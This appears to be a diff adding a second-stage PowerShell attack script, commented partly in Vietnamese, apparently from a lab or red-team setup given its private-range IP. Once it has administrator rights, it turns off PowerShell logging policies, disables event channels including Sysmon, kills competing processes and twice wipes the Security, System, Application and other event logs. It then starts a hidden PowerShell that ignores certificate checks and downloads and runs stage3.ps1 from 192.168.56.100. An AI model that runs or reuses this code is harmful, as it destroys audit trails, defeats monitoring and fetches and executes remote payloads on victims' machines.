@@ -1,0 +1,93 @@
+function Invoke-Stage2Main {
+    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    [Net.WebRequest]::DefaultWebProxy = $null
+
+    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    if (-not $isAdmin) { return }
+
+    # =========================================================
+    # PHASE 1: Disable ALL logging policies (4 paths)
+    # =========================================================
+    $policies = @(
+        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"; Name="EnableScriptBlockLogging"},
+        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging";      Name="EnableModuleLogging"},
+        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription";      Name="EnableTranscripting"},
+        @{Path="HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"; Name="EnableScriptBlockLogging"},
+        @{Path="HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging";      Name="EnableModuleLogging"},
+        @{Path="HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription";      Name="EnableTranscripting"}
+    )
+    foreach ($p in $policies) {
+        if (-not (Test-Path $p.Path)) { New-Item -Path $p.Path -Force | Out-Null }
+        Set-ItemProperty -Path $p.Path -Name $p.Name -Value 0 -Type DWord -Force
+    }
+
+    # Xoa HKCU policies
+    @(
+        "HKCU:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging",
+        "HKCU:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging",
+        "HKCU:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
+    ) | ForEach-Object { if (Test-Path $_) { Remove-Item $_ -Recurse -Force -EA SilentlyContinue } }
+
+    # =========================================================
+    # PHASE 2: Disable channels
+    # =========================================================
+    wevtutil sl "Microsoft-Windows-PowerShell/Operational" /e:false 2>&1 | Out-Null
+    wevtutil sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>&1 | Out-Null
+    wevtutil sl "Microsoft-Windows-Sysmon/Operational" /e:false 2>&1 | Out-Null
+    wevtutil sl "Microsoft-Windows-WMI-Activity/Operational" /e:false 2>&1 | Out-Null
+
+    # =========================================================
+    # PHASE 3: Kill WmiPrvSE + all other PS (tranh sinh event)
+    # =========================================================
+    Get-Process WmiPrvSE -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
+    Get-Process powershell -EA SilentlyContinue | 
+        Where-Object { $_.Id -ne $PID } | 
+        Stop-Process -Force -EA SilentlyContinue
+    Start-Sleep 2
+
+    # =========================================================
+    # PHASE 4: Clear logs tu cmd.exe
+    # =========================================================
+    $clearCmds = 'wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>nul & ' +
+                 'wevtutil cl "Microsoft-Windows-TaskScheduler/Operational" 2>nul & ' +
+                 'wevtutil cl "Microsoft-Windows-Sysmon/Operational" 2>nul & ' +
+                 'wevtutil cl "Microsoft-Windows-WMI-Activity/Operational" 2>nul & ' +
+                 'wevtutil cl "Application" 2>nul & ' +
+                 'wevtutil cl "System" 2>nul & ' +
+                 'wevtutil cl "Security" 2>nul'
+
+    Start-Process cmd.exe -ArgumentList "/c", $clearCmds -WindowStyle Hidden -Wait
+
+    # =========================================================
+    # PHASE 5: Sleep 15s + 2nd clear
+    # =========================================================
+    Start-Sleep -Seconds 15
+    Start-Process cmd.exe -ArgumentList "/c", $clearCmds -WindowStyle Hidden -Wait
+
+    # =========================================================
+    # PHASE 6: Don temp files
+    # =========================================================
+    Start-Sleep 3
+    Get-ChildItem "$env:TEMP\__PSScriptPolicyTest_*.ps1" -EA SilentlyContinue | 
+        Remove-Item -Force -EA SilentlyContinue
+
+    # =========================================================
+    # PHASE 7: Spawn NEW PowerShell process cho stage3
+    # => Process moi doc policy=0 => KHONG LOG 4104
+    # =========================================================
+    $stage3Cmd = "[Net.ServicePointManager]::ServerCertificateValidationCallback={`$true};" +
+                 "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" +
+                 "[Net.WebRequest]::DefaultWebProxy=`$null;" +
+                 "`$wc=New-Object Net.WebClient;`$wc.Proxy=`$null;" +
+                 "IEX `$wc.DownloadString('https://192.168.56.100:8443/stage3.ps1')"
+
+    Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoP","-W","H","-Exec","Bypass","-C",$stage3Cmd
+
+    # =========================================================
+    # PHASE 8: EXIT NGAY — process nay chet => khong sinh event
+    # =========================================================
+    exit
+}
+
+Invoke-Stage2Main
